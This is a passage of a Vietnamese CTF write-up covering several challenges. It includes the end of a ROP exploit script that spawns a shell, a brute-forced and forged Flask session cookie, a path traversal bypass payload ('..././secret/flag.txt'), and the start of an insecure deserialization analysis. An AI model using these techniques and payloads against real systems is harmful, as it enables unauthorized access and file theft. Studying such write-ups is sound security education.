bin_sh,</span><br><span class="line">        pop_rsi, <span class="number">0</span>,</span><br><span class="line">        pop_rdx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        pop_rax, <span class="number">0x3b</span>,</span><br><span class="line">        syscall</span><br><span class="line">    )</span><br><span class="line">    payload = payload.ljust(<span class="number">512</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    encoded = <span class="built_in">bytes</span>([ payload[i] ^ key[i % <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)) ])</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;[BOMB DEVIL] Infuse your energy into the contract: &#x27;</span>, encoded)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Web-Challenge-Flask-of-Cookies"><a href="#Web-Challenge-Flask-of-Cookies" class="headerlink" title="Web | Challenge: Flask of Cookies"></a>Web | Challenge: Flask of Cookies</h1><h2 id="1-Phan-tich-ma-nguon"><a href="#1-Phan-tich-ma-nguon" class="headerlink" title="1. Phân tích mã nguồn"></a>1. Phân tích mã nguồn</h2><ul>
<li>File xử lý chính của chương trình là <code>app.py</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session</span><br><span class="line"><span class="keyword">from</span> dotenv <span class="keyword">import</span> load_dotenv</span><br><span class="line"></span><br><span class="line">load_dotenv() </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.secret_key=os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>]</span><br><span class="line">flag_value =    <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>).read().rstrip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derived_level</span>(<span class="params">sess,secret_key</span>):</span><br><span class="line">    user=sess.get(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    role=sess.get(<span class="string">&quot;role&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> role ==<span class="string">&quot;admin&quot;</span> <span class="keyword">and</span> user==secret_key[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;superadmin&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;user&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;user&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&quot;user&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;user&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    level = derived_level(session,app.secret_key)</span><br><span class="line">    <span class="keyword">if</span> level == <span class="string">&quot;superadmin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,flag=flag_value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Access denied.\n&quot;</span>,<span class="number">403</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8000</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>Để lấy được flag ta cần vào được <code>/admin</code> và route này được xác thực bằng hàm <code>derived_level</code> hàm này sẽ lấy trường <code>user</code> và <code>role</code> trong <code>flask jwt</code> hợp lệ để xác thực.</li>
<li>Nếu <code>role ==&quot;admin&quot;</code> và <code>user==secret_key[::-1]</code> thì xác thực thành công…</li>
<li>Mình đã thử bruteforce secret <code>flask jwt</code> và đã thành công, vậy đơn giản ta chỉ cần dùng <code>flask jwt</code> được giả mạo hợp lý để vượt qua xác thực của hàm <code>derived_level</code> và vào được <code>/admin</code> và lấy flag.</li>
</ul>
<h2 id="2-PoC-cho-challenge"><a href="#2-PoC-cho-challenge" class="headerlink" title="2. PoC cho challenge:"></a>2. PoC cho challenge:</h2><ul>
<li>Đầu tiên, truy cập route <code>/</code> để lấy jwt với role <code>user</code> mà challenge cấp nhằm chuẩn bị cho việc bruteforce.</li>
</ul>
<p><img src="/img/ctf/backdoor/1.png" alt="image-1"></p>
<ul>
<li>Sau khi lấy jwt thành công, mình dùng tool <code>flask-unsign</code> để bruteforce <code>secret</code> và lấy được secret là: <code>qwertyuiop</code></li>
</ul>
<p><img src="/img/ctf/backdoor/2.png" alt="image-2"></p>
<ul>
<li>Tiếp tục reverse secret để giả mạo cho trường <code>user</code>:</li>
</ul>
<p><img src="/img/ctf/backdoor/3.png" alt="image-3"></p>
<ul>
<li>Cuối cùng <code>sign</code> flask jwt được giả mạo hợp lý với secret ta bruteforce là được một flask jwt hợp lệ để lấy flag.</li>
</ul>
<p><img src="/img/ctf/backdoor/4.png" alt="image-4"></p>
<p><img src="/img/ctf/backdoor/5.png" alt="image-5"></p>
<h1 id="Web-Challenge-Image-Gallery"><a href="#Web-Challenge-Image-Gallery" class="headerlink" title="Web | Challenge: Image Gallery"></a>Web | Challenge: Image Gallery</h1><h2 id="1-Phan-tich-ma-nguon-1"><a href="#1-Phan-tich-ma-nguon-1" class="headerlink" title="1. Phân tích mã nguồn"></a>1. Phân tích mã nguồn</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BASE_DIR</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;images&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>), &#123; <span class="attr">index</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> htmlPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> html;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    html = fs.<span class="title function_">readFileSync</span>(htmlPath, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading index.html:&#x27;</span>, e);</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error loading page&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> files = [];</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    files = fs.<span class="title function_">readdirSync</span>(<span class="variable constant_">BASE_DIR</span>)</span><br><span class="line">      .<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> f.<span class="title function_">endsWith</span>(<span class="string">&#x27;.jpg&#x27;</span>) || f.<span class="title function_">endsWith</span>(<span class="string">&#x27;.jpeg&#x27;</span>) || f.<span class="title function_">endsWith</span>(<span class="string">&#x27;.png&#x27;</span>));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading images folder:&#x27;</span>, e);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  html = html.<span class="title function_">replace</span>(<span class="string">&#x27;/*IMAGE_LIST_HERE*/&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(files));</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">send</span>(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/image&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> file = req.<span class="property">query</span>.<span class="property">file</span> || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    file = <span class="built_in">decodeURIComponent</span>(file);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Bad encoding&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  file = file.<span class="title function_">split</span>(<span class="string">&#x27;../&#x27;</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> resolved = path.<span class="title function_">join</span>(<span class="variable constant_">BASE_DIR</span>, file);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readFile</span>(resolved, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Not found.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resolved.<span class="title function_">endsWith</span>(<span class="string">&#x27;.jpg&#x27;</span>) || resolved.<span class="title function_">endsWith</span>(<span class="string">&#x27;.jpeg&#x27;</span>)) &#123;</span><br><span class="line">      res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolved.<span class="title function_">endsWith</span>(<span class="string">&#x27;.png&#x27;</span>)) &#123;</span><br><span class="line">      res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resolved.<span class="title function_">endsWith</span>(<span class="string">&#x27;.txt&#x27;</span>)) &#123;</span><br><span class="line">      res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain; charset=utf-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">send</span>(data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8000</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Running at http://localhost:<span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Bug Path Traversal xuất hiện tại đoạn code:</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = file.<span class="title function_">split</span>(<span class="string">&#x27;../&#x27;</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> resolved = path.<span class="title function_">join</span>(<span class="variable constant_">BASE_DIR</span>, file);</span><br></pre></td></tr></table></figure>

<ul>
<li>Đoạn code trên mặc dù đã cố gắng ngăn bug bằng việc xóa <code>../</code> nhưng không có tác dụng nếu kẻ tấn công truyền <code>..././</code>.</li>
<li>Tận dụng việc validate không an toàn này ta hoàn toàn có thể bypass lớp validate này và lấy flag.</li>
</ul>
<h2 id="2-PoC-cho-challenge-1"><a href="#2-PoC-cho-challenge-1" class="headerlink" title="2. PoC cho challenge"></a>2. PoC cho challenge</h2><ul>
<li>Payload: <code>/image?file=..././secret/flag.txt</code></li>
</ul>
<p><img src="/img/ctf/backdoor/6.png" alt="image-6"></p>
<h1 id="Web-Challenge-Market-Flow"><a href="#Web-Challenge-Market-Flow" class="headerlink" title="Web | Challenge: Market Flow"></a>Web | Challenge: Market Flow</h1><h2 id="1-Phan-tich-ma-nguon-2"><a href="#1-Phan-tich-ma-nguon-2" class="headerlink" title="1. Phân tích mã nguồn"></a>1. Phân tích mã nguồn</h2><ul>
<li><p>Sau khi dành thời gian đọc qua mã nguồn thì mình phát hiện có 3 api quan trọng có thể tận dụng để khai thác:</p>
<ul>
<li><code>/api/analytics/reports</code>: tính năng tạo reports.</li>
<li><code>/api/webhooks/forward</code>: tính năng hỗ trợ forward request đến một url mong muốn.</li>
<li><code>/internal/cron/process</code>: api nội bộ có thể tận dụng để đọc <code>/flag.txt</code>.</li>
</ul>
</li>
<li><p>Đầu tiên ta sẽ phân tích api <code>/api/analytics/reports</code> ở file <code>app.py</code>:</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/analytics/reports&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_report</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    user_id = session[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    report_config = object_manager.deserialize(data)</span><br><span class="line">    </span><br><span class="line">    report_id = secrets.token_hex(<span class="number">16</span>)</span><br><span class="line">    report_token = secrets.token_urlsafe(<span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line">    scheduler.schedule_task(&#123;</span><br><span class="line">        <span class="string">&#x27;task_type&#x27;</span>: <span class="string">&#x27;generate_report&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;report_id&#x27;</span>: report_id,</span><br><span class="line">        <span class="string">&#x27;report_token&#x27;</span>: report_token,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;config&#x27;</span>: data</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&quot;report_id&quot;</span>: report_id,</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;scheduled&quot;</span>,</span><br><span class="line">        <span class="string">&quot;report_url&quot;</span>: <span class="string">f&quot;/reports/<span class="subst">&#123;report_token&#125;</span>.html&quot;</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>Biến <code>data</code> nhận dữ liệu json từ người dùng, sau đó <code>data</code> được truyền tham số vào method <code>deserialize</code> của class <code>object_manager</code> và dựng lại thành đối tượng <code>report_config</code>.</li>
<li>Ta có thể thấy <code>data</code> được <code>deserialize</code> trực tiếp mà không qua một lớp validate nào cho phép tạo đối tượng tùy ý.</li>
<li>Phân tích method <code>deserialize</code> của class <code>object_manager</code> tại file <code>object_manager.py</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> models.user <span class="keyword">import</span> User, UserPreferences</span><br><span class="line"><span class="keyword">from</span> models.campaign <span class="keyword">import</span> Campaign, CampaignSchedule, TargetAudience</span><br><span class="line"><span class="keyword">from</span> models.analytics <span class="keyword">import</span> Analytics, ReportConfiguration, MetricAggregator, AnalyticsProcessor</span><br><span class="line"><span class="keyword">from</span> models.content <span class="keyword">import</span> Content, ContentMetadata, TemplateSpecification</span><br><span class="line"><span class="keyword">from</span> services.webhook_service <span class="keyword">import</span> WebhookForwarder</span><br><span class="line"><span class="keyword">from</span> services.cache_service <span class="keyword">import</span> CacheConfiguration, PersistenceAdapter <span class="comment"># &lt;-- ADD THIS IMPORT</span></span><br><span class="line"></span><br><span class="line">CLASS_REGISTRY = &#123;</span><br><span class="line">    <span class="string">&#x27;User&#x27;</span>: User,</span><br><span class="line">    <span class="string">&#x27;UserPreferences&#x27;</span>: UserPreferences,</span><br><span class="line">    <span class="string">&#x27;Campaign&#x27;</span>: Campaign,</span><br><span class="line">    <span class="string">&#x27;CampaignSchedule&#x27;</span>: CampaignSchedule,</span><br><span class="line">    <span class="string">&#x27;TargetAudience&#x27;</span>: TargetAudience,</span><br><span class="line">    <span class="string">&#x27;Analytics&#x27;</span>: Analytics,</span><br><span class="line">    <span class="string">&#x27;ReportConfiguration&#x27;</span>: ReportConfiguration,</span><br><span class="line">    <span class="string">&#x27;MetricAggregator&#x27;</span>: MetricAggregator,</span><br><span class="line">    <span class="string">&#x27;AnalyticsProcessor&#x27;</span>: AnalyticsProcessor,</span><br><span class="line">    <span class="string">&#x27;Content&#x27;</span>: Content,</span><br><span class="line">    <span class="string">&#x27;ContentMetadata&#x27;</span>: ContentMetadata,</span><br><span class="line">    <span class="string">&#x27;TemplateSpecification&#x27;</span>: TemplateSpecification,</span><br><span class="line">    <span class="string">&#x27;WebhookForwarder&#x27;</span>: WebhookForwarder,</span><br><span class="line">    <span class="string">&#x27;CacheConfiguration&#x27;</span>: CacheConfiguration, </span><br><span class="line">    <span class="string">&#x27;PersistenceAdapter&#x27;</span>: PersistenceAdapter </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObjectManager</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.registry = CLASS_REGISTRY</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deserialize</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        </span><br><span class="line">        obj_type = data.get(<span class="string">&#x27;_type&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> obj_type:</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> obj_type <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.registry:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown type: <span class="subst">&#123;obj_type&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        klass = <span class="variable language_">self</span>.registry[obj_type]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(klass, <span class="string">&#x27;schema_version&#x27;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Invalid class: <span class="subst">&#123;obj_type&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">getattr</span>(klass, <span class="string">&#x27;serializable&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Type not serializable: <span class="subst">&#123;obj_type&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        constructor_data = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items() <span class="keyword">if</span> k != <span class="string">&#x27;_type&#x27;</span>&#125;</span><br><span class="line">        </span><br><span class="line">        instance = klass(**constructor_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;_type&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">                nested = <span class="variable language_">self</span>.deserialize(value)</span><br><span class="line">                <span class="built_in">setattr</span>(instance, key, nested)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(obj, <span class="string">&#x27;to_dict&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> obj.to_dict()</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(obj)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>data</code> được deserialize thành một đối tượng của một trong số class trong dict <code>CLASS_REGISTRY</code> dựa vào trường <code>_type</code> trong dữ liệu json từ người dùng.  </li>
<li>Các thuộc tính của class cũng được tạo qua đoạn code:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">constructor_data = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items() <span class="keyword">if</span> k != <span class="string">&#x27;_type&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">instance = klass(**constructor_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="string">&#x27;_type&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">        nested = <span class="variable language_">self</span>.deserialize(value)</span><br><span class="line">        <span class="built_in">setattr</span>(instance, key, nested)</span><br></pre></td></tr></table></figure>

<ul>
<li>Vì thế ta cũng có thể set các thuộc tính của class vào json data.</li>
<li>Quay trở lại đoạn code liên quan đến api <code>/api/analytics/reports</code> ở file <code>app.py</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scheduler.schedule_task(&#123;</span><br><span class="line">    <span class="string">&#x27;task_type&#x27;</span>: <span class="string">&#x27;generate_report&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;report_id&#x27;</span>: report_id,</span><br><span class="line">    <span class="string">&#x27;report_token&#x27;</span>: report_token,</span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">    <span class="string">&#x27;config&#x27;</span>: data</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>data</code> tiếp tục được làm giá trị cho trường <code>config</code> và đối tượng <code>scheduler</code> gọi method <code>schedule_task</code> để xử lý dữ liệu json:</li>
</ul>
